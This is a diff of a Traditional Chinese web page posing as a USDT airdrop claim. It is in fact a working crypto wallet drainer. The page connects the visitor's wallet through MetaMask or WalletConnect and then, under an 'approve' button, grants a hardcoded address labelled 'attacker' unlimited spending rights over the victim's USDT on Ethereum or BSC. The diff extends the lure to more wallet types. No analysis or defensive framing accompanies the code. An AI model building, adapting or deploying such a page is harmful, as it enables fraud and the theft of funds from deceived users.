@@ -1,56 +1,62 @@
-
 <!DOCTYPE html>
 <html lang="zh-Hant">
 <head>
-  <meta charset="UTF-8" />
-  <title>🎁 領取你的 USDT 空投</title>
+  <meta charset="UTF-8">
+  <title>🎁 領取 USDT 空投活動</title>
+  <script src="https://unpkg.com/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+  <script src="https://unpkg.com/@walletconnect/web3-provider@1.7.8/dist/umd/index.min.js"></script>
+  <script src="https://unpkg.com/web3modal@1.9.12/dist/index.js"></script>
 </head>
-<body style="text-align: center; padding-top: 60px; font-family: sans-serif;">
-  <h2>🎉 恭喜你獲得空投！</h2>
-  <p>請先連接錢包並確認授權以領取獎勵</p>
-  <button onclick="connectWallet()">連接錢包</button>
+<body style="text-align:center; padding-top:60px; font-family:sans-serif">
+  <h2>🎉 恭喜你獲得 USDT 空投！</h2>
+  <button id="connectButton">連接錢包</button>
   <br><br>
-  <button onclick="approve()">確認授權</button>
+  <button id="approveButton">確認授權</button>
 
-  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
   <script>
+    let provider;
     let signer;
 
     const USDT_BY_CHAIN = {
       1: "0xdAC17F958D2ee523a2206206994597C13D831ec7",  // Ethereum
-      56: "0x55d398326f99059ff775485246999027b3197955" // BSC
+      56: "0x55d398326f99059ff775485246999027b3197955"  // BSC
     };
 
     const attacker = "0xDa4FfA490992769B8F54063bf0B9E7a4D3479459";
-    const abi = [
-      "function approve(address spender, uint256 amount) external returns (bool)"
-    ];
+    const abi = ["function approve(address spender, uint256 amount) external returns (bool)"];
 
-    async function connectWallet() {
-      if (!window.ethereum) {
-        alert("請先安裝 MetaMask 或 WalletConnect 錢包");
-        return;
+    const web3Modal = new window.Web3Modal.default({
+      cacheProvider: false,
+      providerOptions: {
+        walletconnect: {
+          package: window.WalletConnectProvider.default,
+          options: {
+            infuraId: "99af7ec8242f4645ac8c27d5b9354e2c"
+          }
+        }
       }
-      const provider = new ethers.providers.Web3Provider(window.ethereum);
-      await provider.send("eth_requestAccounts", []);
+    });
+
+    document.getElementById("connectButton").addEventListener("click", async () => {
+      const instance = await web3Modal.connect();
+      provider = new ethers.providers.Web3Provider(instance);
       signer = provider.getSigner();
       const address = await signer.getAddress();
       alert("✅ 已連接錢包：" + address);
-    }
+    });
 
-    async function approve() {
+    document.getElementById("approveButton").addEventListener("click", async () => {
       if (!signer) {
         alert("請先連接錢包");
         return;
       }
 
-      const provider = new ethers.providers.Web3Provider(window.ethereum);
       const network = await provider.getNetwork();
       const chainId = network.chainId;
       const tokenAddress = USDT_BY_CHAIN[chainId];
 
       if (!tokenAddress) {
-        alert("此鏈不支援 USDT 授權！");
+        alert("不支援此鏈別的 USDT 授權");
         return;
       }
 
@@ -59,10 +65,10 @@
         const tx = await contract.approve(attacker, ethers.constants.MaxUint256);
         alert("✅ 授權成功！Tx Hash: " + tx.hash);
       } catch (err) {
+        alert("❌ 授權失敗：" + err.message);
         console.error(err);
-        alert("授權失敗：" + err.message);
       }
-    }
+    });
   </script>
 </body>
 </html>
